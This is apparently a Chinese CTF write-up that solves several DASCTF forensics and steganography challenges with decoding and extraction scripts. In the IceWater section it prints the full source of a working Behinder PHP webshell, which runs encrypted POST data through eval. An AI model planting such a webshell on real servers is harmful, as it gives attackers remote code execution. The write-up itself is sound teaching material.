> 专门用来搭建 反恐精英1.6（CS 1.6）等基于 Half-Life 引擎的游戏服务器。

但是这道题没有2021L3HCTF那题那么复杂，因为这里的数据包带的数据都比较短

因此这里直接一个个包解码过去就行，也不用根据解密后数据的长度进行分块处理

首先把解密的CPP代码在Linux下编译成.so文件

```cpp
extern "C"
{
    int _LongSwap(int l)
    {
        unsigned int res = __builtin_bswap32(*(unsigned int *)&l);
        return *(int *)&(res);
    }

    const unsigned char mungify_table2[] =
        {
            0x05, 0x61, 0x7A, 0xED,
            0x1B, 0xCA, 0x0D, 0x9B,
            0x4A, 0xF1, 0x64, 0xC7,
            0xB5, 0x8E, 0xDF, 0xA0};

    void COM_UnMunge2(unsigned char *data, int len, int seq)
    {
        int i;
        int mungelen;
        int c;
        int *pc;
        unsigned char *p;
        int j;

        mungelen = len & ~3;
        mungelen /= 4;

        for (i = 0; i < mungelen; i++)
        {
            pc = (int *)&data[i * 4];
            c = *pc;
            c ^= seq;

            p = (unsigned char *)&c;
            for (j = 0; j < 4; j++)
            {
                *p++ ^= (0xa5 | (j << j) | j | mungify_table2[(i + j) & 0x0f]);
            }

            c = _LongSwap(c);
            c ^= ~seq;
            *pc = c;
        }
    }
}
```

```bash
g++ -shared -fPIC -o a.so a.cpp

# g++：使用 C++ 编译器进行编译。
# -shared：指示编译器生成共享库（.so 文件）。
# -fPIC：生成位置无关代码（Position Independent Code），这是生成共享库所必需的。
# -o libcom_unmunge.so：指定输出文件名为 libcom_unmunge.so。
# com_unmunge.cpp：源代码文件名。
```

Linux下输入以上命令即可编译得到 a.so

```python
import json
from ctypes import *
import subprocess

tshark_path = r"tshark"
lib=CDLL('./a.so')
COM_UnMunge=lib.COM_UnMunge2

def solve():
    command = [
        tshark_path,
        '-r', "secret.pcapng",
        '-Y', 'udp',
        '-T', 'json',
        '-e', 'ip.src',
        '-e', 'ip.dst',
        '-e', 'data.data',
    ]
    res = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    json_out = json.loads(res.stdout)
    for packet in json_out:
        try:
            layers = packet.get('_source', {}).get('layers', {})
            ip_src = layers.get('ip.src', [None])[0]
            ip_dst = layers.get('ip.dst', [None])[0]
            data = layers.get('data.data', [None])[0]
            if not all([ip_src, ip_dst, data]):
                continue
            bytes_data = bytes.fromhex(data)
            enc_data = bytes_data[8:]
            seq = bytes_data[:4]
            buf=create_string_buffer(enc_data)
            COM_UnMunge(buf,len(enc_data),seq[0])
            buf = bytes(buf) # 这里要先把 C-String 类型转为 bytes 类型
            print(f"[+] {ip_src} ==> {ip_dst}:\n{bytes(buf)}")
            if b'DASCTF' in buf:
                break
        except Exception as e:
            print(f"[x] {e}")

if __name__ == "__main__":
    solve()
```

最后Linux下运行以上代码即可得到最后的flag：`DASCTF{C0UnT3R_S7R1K3_4nD_C0BaLt_57RIK3_4LL_FUN}`

![](imgs/image-20250228152411061.png)

## 线下决赛

### 题目名称 只留清白在人间

解压附件压缩包，得到一个位置后缀的文件，因此尝试file识别一下

![](imgs/image-20250417193834317.png)

发现是磁盘文件，因此我们尝试直接用r-stdio打开

![](imgs/image-20250417193952651.png)

发现有一个`The flag is here.zip`，尝试恢复，发现可以正常恢复出来

![](imgs/image-20250417194045254.png)

打开发现里面有很多的目录，当我们按照时间早晚进行排序的时候，发现了明显的zip压缩包的PK头(504B0304)

因此尝试写一个Python脚本进行提取

```python
import pyzipper
from datetime import datetime

def func1(zip_file_path):
    res = ''
    file_list = []
    with pyzipper.AESZipFile(zip_file_path) as zip_file:
        for file_info in zip_file.infolist():
            filename = file_info.filename
            # 跳过目录项
            if filename.endswith('/'):
                continue
            # 将修改时间转换为 datetime 对象
            mod_time = datetime(
                file_info.date_time[0],  # 年
                file_info.date_time[1],  # 月
                file_info.date_time[2],  # 日
                file_info.date_time[3],  # 时
                file_info.date_time[4],  # 分
                file_info.date_time[5]   # 秒
            )
            file_list.append((filename, mod_time))
        file_list.sort(key=lambda x: x[1]) # 按照修改时间排序
    for item in file_list:
        res += item[0][0]
    zip_data = bytes.fromhex(res)
    with open("flag.zip",'wb') as f:
        f.write(zip_data)


if __name__ == "__main__":
    zip_path = "The flag is here.zip"
    func1(zip_path)
```

运行以上脚本提取出压缩包后，解压即可得到flag：`DASCTF{Q29uZ3JhdHVsYXRpb25z}`

![](imgs/image-20250417194244861.png)

当然，如果这里不会写脚本提取，我们也可以尝试用winrar的报告功能生成报告

![](imgs/image-20250417194400019.png)

![](imgs/image-20250417194456142.png)

然后我们再写一个脚本对报告中的数据进行处理即可

```python
def func2():
    res = ""
    with open("The flag is here.txt",'r') as f:
        data = f.read().split()
    for line in data:
        if 'flag.txt' in line:
            # print(line)
            res += line[0]
    print(res)
```

### 题目名称 IceWater

打开流量包，发现是webshell流量，直接拿CTF-NetA梭一下

根据默认密钥 `e45e329feb5d925b`，我们可以知道是冰蝎流量分析

![](imgs/image-20250417210225286.png)

流量包不多，我们手动解密分析了前面几个流量包后发现，一共有两个马，分别是`shell.php`和`she1l.php`

![](imgs/image-20250419154429421.png)

![](imgs/image-20250419154438433.png)

然后解密HTTP流4的数据，可以得到第二个马的源码

![](imgs/image-20250419154513307.png)

![](imgs/image-20250419154537135.png)

![](imgs/image-20250419154550735.png)

![](imgs/image-20250419154618668.png)

```python
<?php
@error_reporting(0);
session_start();
    $key="5b4582c9d56b5b33";
	$_SESSION['k']=$key;
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>

```

然后发现第二个马的密钥不是默认密钥了，是 `5b4582c9d56b5b33`

并且加密方式也换成了AES-CBC，IV为`\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00` 


![](imgs/image-20250419154902953.png)

然后当我们分析到HTTP流7和流8的时候，发现攻击者创建了一张PNG图片

![](imgs/image-20250419155450612.png)

![](imgs/image-20250419155506249.png)

这个流里有好多个请求和响应，我们继续分析后面的请求，发现攻击者一直在往这个PNG里加东西

猜测是这个图片比较大，攻击者分了好几次写入

![](imgs/image-20250419155644798.png)

鉴于流量包中的请求比较多，因此我们把流7和流8的数据以文本的形式保存到本地，然后写个脚本匹配提取即可

```python
import re
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

key = "5b4582c9d56b5b33"
key = key.encode('utf-8').ljust(16, b'\x00')  # 默认填充到16字节(AES-128)
iv = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

def decrypt_aes_cbc(ciphertext_base64):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = base64.b64decode(ciphertext_base64)
    decrypted = cipher.decrypt(ciphertext)
    return decrypted
        
def func1():
    dec_data = []
    with open("1.txt",'r') as f:
        data = f.read()
    req_data = re.findall(r"Cookie: PHPSESSID=m76qslkgb4tuu1ocg07i1rr1f0\n\n(.*?)\nHTTP/1",data)
    # print(len(req_data))
    for enc_data in req_data:
        # print(enc_data)
        dec_data.append(decrypt_aes_cbc(enc_data).decode())
    # print(len(dec_data))
    with open("2.txt",'w') as f:
        f.write('\n'.join(dec_data))

def func2():
    dec_data = []
    with open("2.txt",'r') as f:
        data = f.read()
    base64_data = re.findall(r"base64_decode\('(.*?)'\)\);",data)
    for item in base64_data:
        # print(item[-100:])
        dec_data.append(base64.b64decode(item))
    # print(len(dec_data))
    with open("3.txt",'wb') as f:
        f.write(b"".join(dec_data))

def func3():
    with open("3.txt",'r',errors='ignore') as f:
        data = f.read()
    base64_data = re.findall(r"\$content=\"(.*?)\"",data)
    # print(len(base64_data))
    base64_png = "".join(base64_data)
    png_data = base64.b64decode(base64_png)
    with open("flag.png",'wb') as f:
        f.write(png_data)

if __name__ == "__main__":
    # func1()
    # func2()
    func3()
```

提取完整后可以得到下图

![](imgs/image-20250419162534043.png)

然后用工具提取一下盲水印即可得到最后的flag：`DASCTF{7da5cf04-f7ae-42cf-b98c-7a758a257a65}`

当然，这里也可以多换几个工具来提取，找到提取最清晰的即可

![](imgs/image-20250419162621758.png)

![](imgs/image-20250419162925306.png)

![](imgs/image-20250419162956540.png)

![](imgs/image-20250419162847980.png)

![](imgs/image-20250419162830766.png)


### 题目名称 并非乱ping

题目附件给了一个加密的压缩包、一个wav以及一个`hide.py`

![](imgs/image-20250417201252117.png)

其中`hide.py`的内容如下

```python
import wave

def hide_message(input_wav, output_wav, message):
    with wave.open(input_wav, 'rb') as wav:
        params = wav.getparams()
        frames = wav.readframes(wav.getnframes())

    message_binary = ''.join(format(ord(char), '08b') for char in message)

    message_binary += '00000000'

    frames_array = bytearray(frames)

    if len(message_binary) > len(frames_array):
        raise ValueError("Message is too long to hide in the given audio file.")

    for i in range(len(message_binary)):
        frames_array[i] = (frames_array[i] & 253) | (int(message_binary[i]) << 1)

    with wave.open(output_wav, 'wb') as output_wav_file:
        output_wav_file.setparams(params)
        output_wav_file.writeframes(frames_array)

    print("successfully!")
```

发现是一个利用wav二进制倒数第3位进行LSB隐写的脚本，因此我们写个脚本提取一下隐写的数据即可

```python
import wave

def extract_message(input_wav):
    with wave.open(input_wav, 'rb') as wav:
        frames = wav.readframes(wav.getnframes())
    frames_array = bytearray(frames)
    binary_message = []
    end_marker = '00000000'
    current_byte = []
    for byte in frames_array:
        # 提取每个字节的第2位 (从0开始计数)
        bit = (byte >> 1) & 1
        current_byte.append(str(bit))
        if len(current_byte) == 8:
            byte_str = ''.join(current_byte)
            if byte_str == end_marker:
                break
            binary_message.append(byte_str)
            current_byte = []
    message = ''.join([chr(int(b, 2)) for b in binary_message])
    return message

if __name__ == "__main__":
    input_file = "1.wav"
    hidden_message = extract_message(input_file)
    print(hidden_message)
	# password_is_oSthinggg
```

运行后即可得到解压密码：`password_is_oSthinggg`

解压后得到一个未知后缀的文件，010打开发现文件存在数据逆置的特征

因此尝试用CyberChef逆置一下，发现是一个流量包文件

![](imgs/image-20250417201650812.png)

打开流量包，结合题目名字很容易知道解题关键在ping上，即ICMP流量中

翻看流量包的相关字段，猜测flag是被隐藏在了ICMP流量的ttl时延中

![](imgs/image-20250417201804808.png)

```bash
tshark -r download.pcapng -Y '(icmp) && (ip.src == 192.168.1.1)' -T fields -e 'ip.ttl' > 1.txt
```

然后结合flag的前缀`DASCTF{`，发现flag被隐藏在ttl二进制的前两位中

![](imgs/image-20250417203304205.png)

因此写个脚本提取ttl二进制的前两位，连起来转字符串即可得到最后的flag：`DASCTF{627848c0-759c-11ef-999f-000c290c196e}`

```python
import libnum

def func1():
    res = ""
    with open("1.txt",'r') as f:
        data = f.read().split()
    for item in data:
        bin_data = bin(int(item))[2:].zfill(8)
        res += bin_data[:2]
    print(res)
    print(libnum.b2s(res))
    # b'DASCTF{627848c0-759c-11ef-999f-000c290c196e}'


if __name__ == "__main__":
    func1()
```

### 题目名称 Steganography_challenges0.3

> 题目附件： https://pan.baidu.com/s/1F6ZBdr-Nnhw0UmjF3_9DzA?pwd=f83m 提取码: f83m
> 
> 附件已更新，原来的附件是损坏的，感谢`@IcePeak`师傅的提醒，要不然对着坏的附件，这题这辈子都做不出来了

> 本题的成功解出离不开`@IcePeak`师傅的帮助

解压附件压缩包，可以得到一个`encrypt.py`和一张PNG图片，内容如下所示

```python
from PIL import Image
from Crypto.Cipher import ARC4

def rc4_encrypt(data, key):
    cipher = ARC4.new(key.encode())
    return cipher.encrypt(data)

image = Image.open('flag1.png').convert('RGB')
width, height = image.size

new_image = Image.new('RGB', (width, height))

key = ''#ps:Passwords are common passwords (weak passwords) that may be required...

for y in range(height):
    for x in range(width):
        r, g, b = image.getpixel((x, y))
        rgb_bytes = bytes([r, g, b])
        encrypted_rgb = rc4_encrypt(rgb_bytes, key)
        new_image.putpixel((x, y), (encrypted_rgb[0], encrypted_rgb[1], encrypted_rgb[2]))

new_image.save('Steganography_challenges0.3.png')
```

![](imgs/image-20250331201515898.png)


发现是用弱密码简单加密了一下图片，然后我们用stegsolve打开图片可以发现图片存在LSB隐写

![](imgs/image-20250331201900614.png)

因此我们根据LSB隐写的内容写个脚本爆破一下密钥即可

```python
def func1():
    with open("rockyou.txt",'r',errors='ignore') as f:
        keys = f.read().split()
    for key in keys:
        img = Image.open("1.png")
        w,h = img.size
        img1 = Image.new('RGB',(w,h))
        for y in range(h):
            for x in range(w):
                r,g,b = img.getpixel((x,y))
                rgb_bytes = bytes([r,g,b])
                dec_rgb = rc4_decrypt(rgb_bytes,key)
                img1.putpixel((x,y),(dec_rgb[0],dec_rgb[1],dec_rgb[2]))
        # img1.show()
        bin_data = (np.array(img1) & 1).flatten().astype(str)
        res = libnum.b2s(''.join(bin_data))
        print(res[:100])
        if b'flag' in res or b'DASCTF' in res:
            print(f"[+] 爆破成功，密钥是 {key}")
            print(res[:150])
            break
# [+] 爆破成功，密钥是 password
# b"DASCTF{01d0eed8-2e4b,Do you know DWT-QIM? Now I'll give you the key information,
# next_information_length = 102,block_size = 8,delta=8,Green channel
```

运行以上脚本后即可得到第一段flag：`DASCTF{01d0eed8-2e4b`，以及下一步的提示

并且可以用爆破出来的密码还原图片，还原后的图片如下

![](imgs/image-20250331201753939.png)

然后去网上搜`DWT-QIM`相关的内容，可以搜到[2024WMCTF-steg_allInOne](https://blog.wm-team.cn/index.php/archives/80/#steg_allInOne)这道题

发现整体思路和这道题差不多，猜测出题人的出题思路也是来源于这道题

然后我们010打开附件给的那张PNG，发现图片的末尾藏了一张base64编码后的图片

![](imgs/image-20250401183123671.png)

提取出来base64解码即可得到下图

![](imgs/image-20250401183228651.png)

参考上面`2024WMCTF`那道题的wp，改一下提取水印的脚本

```python
from PIL import Image
import numpy as np
import libnum
import pywt

def extract_qim(block, delta):
    block_flat = block.flatten()
    avg = np.mean(block_flat)
    mod_value = avg % delta
    if mod_value < delta / 4 or mod_value > 3 * delta / 4:
        return '0'
    else:
        return '1'

def extract_watermark1(G_watermarked, watermark_length, delta):
    watermark_bits = []
    block_size = 8
    k = 0
    for i in range(0, G_watermarked.shape[0], block_size):
        for j in range(0, G_watermarked.shape[1], block_size):
            if k < watermark_length * 8:
                block = G_watermarked[i:i+block_size, j:j+block_size]
                if block.shape != (block_size, block_size):
                    continue
                coeffs = pywt.dwt2(block, 'haar')
                LL, (LH, HL, HH) = coeffs
                bit = extract_qim(LL, delta)
                watermark_bits.append(bit)
                k += 1

    watermark_str = ''.join(watermark_bits)
    return watermark_str

if __name__ == "__main__":
    p = Image.open('download.png').convert('RGB')
    p_data = np.array(p)
    G = p_data[:,:,1].astype(np.float32)
    print(libnum.b2s(extract_watermark1(G,102,8)))
# b"Hey boy, I'm here to help you, now you'ze one step away from successl let me |ell you key:79557c2d8f94"
```

运行后可以得到如下内容，提示了我们一个key：`79557c2d8f94`

```
b"Hey boy, I'm here to help you, now you'ze one step away from successl let me |ell you key:79557c2d8f94"
```


然后我们010打开提取得到的图片，发现有一块异常的`IDAT chunk`

![](imgs/image-20250401183350583.png)

尝试给他单独提取出来，发现按照`2024WMCTF`的思路做得不到有用的东西

然后也尝试了异或密钥，也没有得到有效的信息，在`@IcePeak`师傅的提醒下，查看了这块数据的大小

发现刚刚好是300kb，因此结合题目给了密钥，联想到可能是VeraCrypt加密容器

![](imgs/image-20250401184416937.png)

然后这里提取这块数据的时候要注意，不要把表示数据长度的那四个字节也提取出来

我们要从下图中高亮的位置后面开始提取

![](imgs/image-20250401184348934.png)

提取出来后，用VC挂载即可得到flag2：`-4dc6-9152-ffe56b0f70b4}`

![](imgs/image-20250401184736460.png)

综上，将得到的两段flag拼起来即可得到最后的flag：`DASCTF{01d0eed8-2e4b-4dc6-9152-ffe56b0f70b4}`

> 一些碎碎念：出题人最后套了一个VC加密容器确实会比较难想到，需要选手结合数据的长度和密钥进行联想
> 
> 但也正是出题人这最后套了一下VC加密容器，让这道题更贴合“数据安全”这个分类吧

---

> 作者: [Lunatic](https://goodlunatic.github.io)  
> URL: https://goodlunatic.github.io/posts/f002407/  

